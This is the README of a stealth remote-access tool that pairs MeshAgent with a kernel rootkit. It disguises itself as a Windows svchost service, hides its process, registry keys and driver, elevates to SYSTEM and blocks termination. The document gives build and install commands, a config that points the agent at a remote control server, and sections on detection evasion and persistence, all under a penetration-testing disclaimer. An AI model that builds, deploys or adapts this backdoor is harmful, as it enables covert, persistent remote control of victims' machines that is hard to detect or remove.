# Modus - Stealth MeshAgent Implementation

## Overview

Modus is a modified version of MeshAgent that integrates with the Cronos rootkit to create a stealth remote management tool. The agent runs as a DLL within `svchost.exe`, appearing as a legitimate Windows system service while maintaining full MeshAgent functionality.

## ⚠️ SECURITY WARNING

**This tool is designed for AUTHORIZED PENETRATION TESTING ONLY.**

- Creates a protected service that can be difficult to detect and remove
- May cause system instability (BSODs) if improperly terminated
- Should only be used on test systems with proper authorization
- Use at your own risk - this software comes with NO WARRANTY

## Features

### Stealth Capabilities
- ✅ **Process Hiding**: Appears as `svchost.exe` in Task Manager
- ✅ **Registry Hiding**: Service registry keys hidden from `regedit`
- ✅ **Driver Protection**: Protected by kernel-mode Cronos rootkit
- ✅ **Process Protection**: Cannot be terminated by normal means
- ✅ **Privilege Elevation**: Automatically elevates to SYSTEM privileges

### MeshAgent Functionality
- ✅ **WebSocket Connectivity**: Full MeshCentral server connectivity
- ✅ **KVM Support**: Remote desktop functionality
- ✅ **Terminal Access**: Remote command line access
- ✅ **File Operations**: Remote file management
- ✅ **Self-Updates**: Automatic agent updates from server
- ✅ **Firewall Rules**: Automatic firewall configuration

### Service Configuration
- **Service Name**: `svchost_net`
- **Display Name**: `Network Host Service`
- **Process**: Runs within `svchost.exe -k netsvcs`
- **DLL Location**: `%SystemRoot%\system32\svchost.dll`
- **Driver**: `%SystemRoot%\system32\drivers\CronosRootkit.sys`

## Requirements

### System Requirements
- **Operating System**: Windows 10/11 x64 only
- **Privileges**: Administrator access required
- **Test Signing**: Must be enabled (`bcdedit /set testsigning on`)
- **Architecture**: x64 (64-bit) systems only

### Build Environment
- **Visual Studio 2019** with C++ build tools
- **Windows Driver Kit (WDK) 10** for driver compilation
- **Windows SDK** for Windows APIs

## MeshCentral Server Configuration

Modus requires connection details for your MeshCentral server. This information is stored in a `svchost.msh` configuration file.

### Automatic Configuration
Use the provided configuration helper:
```cmd
configure_modus.bat
```

This script will guide you through:
1. **Server URL**: Your MeshCentral WebSocket endpoint
2. **Mesh ID**: Unique identifier for your device group
3. **Server ID**: Certificate hash for server verification
4. **Optional Settings**: Agent name, mesh group name, etc.

### Manual Configuration
Create `svchost.msh` with the following format:
```ini
# MeshCentral Connection Configuration
MeshName=Modus Network
MeshType=2
MeshID=0x[64-character hex string]
ServerID=0x[64-character hex string]  
MeshServer=wss://your-meshcentral-server.com:443/agent.ashx

# Agent Settings
agentName=Modus-Agent
disableUpdate=0
logUpdate=1
controlChannelIdleTimeout=300

# Service Branding
displayName=Network Host Service
meshServiceName=Network Host Service
```

### Finding MeshCentral Values
1. **Login to MeshCentral** as administrator
2. **Navigate to "My Devices"** > Select your mesh group
3. **Click "Add Device"** > "Windows" > "Installation"
4. **Copy the values**:
   - `MeshID=0x...` (long hex string)
   - `ServerID=0x...` (long hex string)
   - Server URL from the connection string

### Security Notes
- The `.msh` file contains sensitive server connection details
- Protect this file during deployment and transport
- The installation script copies it to a secure system location
- Consider deleting the local copy after successful installation

## Installation Guide
```cmd
# Run as Administrator
bcdedit /set testsigning on
# Reboot system
shutdown /r /t 0
```

### Step 2: Configure MeshCentral Connection
```cmd
# Configure server connection details
configure_modus.bat
```

### Step 3: Build Components
```cmd
# Open Visual Studio Developer Command Prompt as Administrator
cd C:\MeshAgent
build_modus.bat
```

### Step 4: Install Service
```cmd
# Run as Administrator
install_stealth_service.bat
```

### Step 5: Verify Installation
```cmd
# Check service status
sc query svchost_net

# Check process (should appear as svchost.exe)
tasklist | findstr svchost

# Verify stealth (registry key should be hidden)
regedit
# Navigate to HKLM\SYSTEM\CurrentControlSet\Services\
# svchost_net should NOT be visible
```

## Removal Guide

### Safe Removal
```cmd
# Run as Administrator
cleanup_stealth_service.bat
```

### Force Removal (if protected)
If the service is protected and normal removal fails:

1. **Boot from Windows Recovery/PE disk**
2. **Delete files manually**:
   - `C:\Windows\System32\svchost.dll`
   - `C:\Windows\System32\drivers\CronosRootkit.sys`
3. **Clean registry** (from external system):
   - `HKLM\SYSTEM\CurrentControlSet\Services\svchost_net`
4. **Remove from netsvcs group**:
   - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost`

## Technical Details

### Architecture
```
┌─────────────────────────────────────────────────────────────┐
│                    User Mode                                │
├─────────────────────────────────────────────────────────────┤
│  svchost.exe -k netsvcs                                     │
│  ├── svchost.dll (Modus Service)                           │
│  │   ├── ServiceMain() - DLL Entry Point                   │
│  │   ├── MeshAgent Core - WebSocket, KVM, etc.             │
│  │   ├── MinHook - Registry API Hooking                    │
│  │   └── Cronos IOCTL Communication                        │
│  └── Other Windows Services...                             │
├─────────────────────────────────────────────────────────────┤
│                   Kernel Mode                               │
├─────────────────────────────────────────────────────────────┤
│  CronosRootkit.sys (Kernel Driver)                         │
│  ├── IOCTL_HIDEPROC - Hide process from Task Manager       │
│  ├── IOCTL_ELEVATEME - Copy SYSTEM token from PID 4        │
│  ├── IOCTL_PROTECT - Set process as critical               │
│  └── Driver Self-Hiding - Unlink from driver list         │
└─────────────────────────────────────────────────────────────┘
```

### Registry Hiding Implementation
- **MinHook** library intercepts `NtEnumerateKey` and `NtQueryValueKey`
- Filters out any registry keys containing `svchost_net`
- Registry entries remain functional but hidden from `regedit`

### Cronos Driver Integration
- Driver embedded as binary resource in `MeshService64.rc`
- Extracted to `C:\Windows\System32\drivers\CronosRootkit.sys` on startup
- Loaded via Service Control Manager (SCM)
- IOCTL communication for process manipulation

### Firewall Configuration
- Automatically creates Windows Firewall rules
- Uses "Network Host Service" branding instead of "Mesh Agent"
- Opens required ports: 16990 (TCP), 16991 (UDP)

## Troubleshooting

### Common Issues

#### Build Failures
- **Error**: "msbuild not found"
  - **Solution**: Run from Visual Studio Developer Command Prompt
- **Error**: "Driver build failed"
  - **Solution**: Install Windows Driver Kit (WDK) 10
- **Error**: "Access denied"  
  - **Solution**: Run as Administrator

#### Installation Issues
- **Error**: "Service failed to start"
  - **Cause**: Driver loading failed (test signing not enabled)
  - **Solution**: Enable test signing and reboot
- **Error**: "Access denied copying DLL"
  - **Solution**: Stop any running MeshAgent services first

#### Runtime Issues  
- **Issue**: Service visible in Task Manager
  - **Cause**: Cronos driver not loaded or process hiding failed
  - **Check**: Windows Event Log for driver errors
- **Issue**: Registry keys visible in regedit
  - **Cause**: MinHook registry hooking failed
  - **Check**: Verify DLL exports and API hooking

### Debug Information
```cmd
# Check service status
sc query svchost_net

# Check driver status  
sc query cronos

# Check Windows Event Log
eventvwr.msc
# Navigate to Windows Logs > System
# Look for Cronos or svchost_net related errors

# Check firewall rules
netsh advfirewall firewall show rule name="Network Host Service"
```

### Log Files
- **Service Events**: Windows Event Log (System)
- **Driver Events**: Windows Event Log (System)  
- **MeshAgent Logs**: Check MeshCentral server for agent connectivity

## Security Considerations

### Detection Evasion
- Process appears as legitimate `svchost.exe`
- Registry entries hidden from standard tools
- Firewall rules use generic "Network Host Service" naming
- No obvious indicators in standard system monitoring

### Persistence Mechanisms
- Service configured for automatic startup
- Protected by kernel-mode driver
- Self-healing via MeshAgent update mechanism
- Difficult to remove without proper cleanup procedures

### Potential System Impact
- **BSOD Risk**: Forcible termination may crash system
- **Performance**: Minimal overhead (<5% CPU increase)
- **Stability**: Tested on Windows 10/11 x64
- **Compatibility**: May conflict with some EDR solutions

## Ethical Use Guidelines

### Authorized Use Only
- ✅ Penetration testing with written authorization
- ✅ Red team exercises on owned systems
- ✅ Security research in controlled environments
- ❌ Unauthorized access to systems
- ❌ Malicious activities of any kind

### Legal Compliance
- Ensure proper authorization before deployment
- Follow applicable laws and regulations
- Document usage for compliance purposes
- Remove from systems when testing complete

### Responsible Disclosure
- Report vulnerabilities found during testing
- Coordinate with system owners for remediation
- Follow responsible disclosure practices

## File Structure

```
C:\MeshAgent\
├── build_modus.bat                # Complete build script
├── configure_modus.bat            # MSH configuration helper
├── install_stealth_service.bat    # Service installation
├── cleanup_stealth_service.bat    # Service removal
├── verify_modus.bat               # System verification
├── svchost.msh                    # MeshCentral connection config
├── svchost.dll                    # Built service DLL
├── CronosRootkit.sys              # Built driver
├── ServiceMain.c                  # Main service implementation
├── firewall.cpp                   # Firewall configuration
├── Cronos Rootkit/                # Driver source code
│   ├── Driver.cpp                 # Driver implementation
│   ├── Driver.h                   # IOCTL definitions
│   ├── Rootkit.cpp               # Process hiding logic
│   └── Ghost.cpp                 # Driver hiding logic
├── MinHook/                       # API hooking library
│   ├── include/MinHook.h         # API definitions
│   └── src/                      # Implementation
├── meshservice/                   # Service project
│   ├── MeshService-2022.vcxproj  # Visual Studio project
│   ├── MeshService64.rc          # Resources (driver embedded)
│   └── resource.h                # Resource definitions
└── meshcore/                      # MeshAgent core functionality
```

## Support and Contact

This is an educational/research project. For issues or questions:

1. **Check troubleshooting section** above
2. **Review Windows Event Logs** for error details  
3. **Test in isolated environment** before production use
4. **Ensure proper authorization** before deployment

## License and Disclaimer

This software is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this software. Users must comply with all applicable laws and obtain proper authorization before use.

**Use at your own risk. No warranty provided.**
